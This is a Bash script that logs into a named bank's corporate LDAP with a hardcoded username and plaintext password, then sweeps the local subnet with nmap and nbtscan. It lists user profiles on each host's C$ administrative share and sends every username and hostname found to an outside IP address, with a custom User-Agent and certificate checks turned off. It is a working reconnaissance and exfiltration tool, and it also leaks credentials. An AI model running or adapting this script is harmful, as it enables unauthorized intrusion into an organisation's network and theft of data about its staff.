#!/bin/bash

prod="135.237.98.61"
dev="127.0.0.1"
ambiente=$prod
URL="https://$ambiente:3000/api/status"
USER_AGENT="KJASNFI982HJKB214h21094u21JOKFSLKF020830921894321hkj421kjb4j21b4kj21b421984219421984219521n5kj21JOIDA"

ldap_server="ldap://corp.bradesco.com.br"
ldap_user="i176802"
ldap_pass="timao10"
smbuser="corp\\i176802%timao10"
INTERFACE="eth1"
IP_ADDR=$(ip addr show $INTERFACE | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
PREFIXO=$(ip addr show $INTERFACE | grep 'inet ' | awk '{print $2}' | cut -d/ -f2)
REDE=$(echo $IP_ADDR | cut -d. -f1-3).0/$PREFIXO
netname=$(echo $IP_ADDR | cut -d. -f1-3).0-$PREFIXO

limpar_linha() {
  # Move o cursor para o início da linha
  tput cr
  # Limpa a linha
  printf "%s" "$(tput el)"
}

# Função para autenticar o usuário no LDAP
authenticate_ldap(){
    result=$(ldapsearch -x -H "$ldap_server" -D "corp\\$ldap_user" -w "$ldap_pass")

    # Verifica o status da execução do comando ldapsearch
    if echo "$result" | grep -q "# numResponses: 1"; then
        echo "[+] Autenticação bem-sucedida para $ldap_user"
        netscan
    else
        echo "[x] Falha na autenticação para $ldap_user"
        exit
    fi
}

netscan(){
    if [ -z "$IP_ADDR" ]; then
        echo "Não foi possível encontrar um endereço IP para a interface $INTERFACE."
        exit
    fi

    echo "[+] Scan subnet $REDE"
    output=$(sudo nmap -sn -oG - $REDE | grep "Up" | awk '{print $2}' | grep -v "Nmap")
    echo "[+] Varredura concluída!"
    lines=$(echo "$output" | wc -l)
    nbtlist=""
    i=0
    echo "[+] Coletando hostnames"
    while IFS= read -r ip; do
        i=$(($i+1))
        if [[ -n "$ip" ]]; then
            nbtscan_output=$(nbtscan -s "," $ip | cut -d "," -f1,2 | tr -d ' ')
            if [[ -n "$nbtscan_output" ]]; then
                nbtscan_output+=".corp.bradesco.com.br"
            	nbtlist+="$nbtscan_output"
                nbtlist+=$'\n'
            fi
            limpar_linha
            echo -n "[+] $ip ($i/$lines)"
            
        fi
    done <<< "$output"
    #echo "$nbtlist"
    echo ""
    userfind
}

userfind() {
    i=0
    while IFS=',' read -r col1 col2; do
        i=$(($i+1))
	user_discovery=$(smbclient //"$col1"/C$/ -U corp\\"$ldap_user"%"$ldap_pass" -c 'ls Users\\' 2>&- | awk '{print $1,$5,$6,$8}' | sort -k 2,2 -k 3,3 -k 4,4 | grep -v -E "\.\.|\.|Default|Usuário|All|Public|pus|PUS" | tail -1 | awk '{print $1}') 
	echo -n "[+] $user_discovery : $col1 : $col2 ($i/$lines) " 
        python3 -c "import requests,urllib3; urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning); response = requests.get('https://$ambiente:3000/api/database/add_hash', params={'userid': '$user_discovery', 'hostname': '$col2'}, headers={'Host': '$ambiente:3000', 'User-Agent': '$USER_AGENT', 'Connection': 'keep-alive'}, verify=False); print(response.text)"  | grep "Database"
        limpar_linha

    done <<< "$nbtlist"
}

authenticate_ldap
